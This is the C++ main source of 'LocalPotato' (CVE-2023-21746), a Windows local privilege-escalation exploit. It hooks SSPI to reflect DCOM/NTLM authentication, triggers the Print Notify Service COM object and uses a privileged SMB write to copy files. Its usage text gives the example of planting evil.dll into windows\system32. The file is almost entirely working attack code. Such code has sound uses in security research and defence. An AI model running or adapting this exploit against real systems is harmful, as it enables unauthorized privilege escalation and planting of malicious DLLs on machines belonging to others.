#include "Windows.h"
#include "stdio.h"
#include "DCOMReflection.h"
#include "PotatoTrigger.h"
#include "SMBClient.h"

void usage();
wchar_t* destfname=NULL;
wchar_t* inputfname=NULL;


int wmain(int argc, wchar_t** argv) 
{
	printf("\n\n\t LocalPotato (aka CVE-2023-21746) \n");
	printf("\t by splinter_code & decoder_it\n\n");
	//{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}
	WCHAR defaultClsidStr[] = L"{854A20FB-2D44-457D-992F-EF13785D2B51}"; // Print Notify Service CLSID
	WCHAR defaultComPort[] = L"10247";
	PWCHAR clsidStr = defaultClsidStr;
	PWCHAR comPort = defaultComPort;
	int cnt = 1;
	while ((argc > 1) && (argv[cnt][0] == '-'))
	{
		switch (argv[cnt][1])
		{
		case 'c':
			++cnt;
			--argc;
			clsidStr = argv[cnt];
			break;

		case 'p':
			++cnt;
			--argc;
			comPort = argv[cnt];
			break;

		case 'h':
			usage();
			exit(0);
		case 'o':
			++cnt;
			--argc;
			if (*argv[cnt] == '\\')
				++argv[cnt];
			destfname = argv[cnt];
			break;
		case 'i':
			++cnt;
			--argc;
			inputfname = argv[cnt];
			break;

		default:
			printf("Wrong Argument: %S\n", argv[cnt]);
			usage();
			exit(-1);
		}
		++cnt;
		--argc;
	}
	if (destfname == NULL || inputfname == NULL || destfname[1]==':')
	{
		usage();
		return 1;
	}
	HANDLE hTread = CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SMBAuthenticatedFileWrite), NULL, 0, NULL);
	HookSSPIForDCOMReflection();
	PotatoTrigger(clsidStr, comPort, hTread);
	if (WaitForSingleObject(hTread, 3000) == WAIT_TIMEOUT) {
		printf("[-] The privileged process failed to communicate with our COM Server :(");
	}
	return 0;
}

void usage()
{
	printf("\n");
	printf("Mandatory Args: \n"
		"-i Source file to copy\n"
		"-o Output file - do not specify the drive letter\n"
		"Example: localpotato -i c:\\hacker\\evil.dll -o windows\\system32\\evil.dll\n\n"
	);
	printf("Optional Args: \n"
		"-c CLSID (Default {854A20FB-2D44-457D-992F-EF13785D2B51})\n"
		"-p COM server port (Default 10271)\n"
	);
}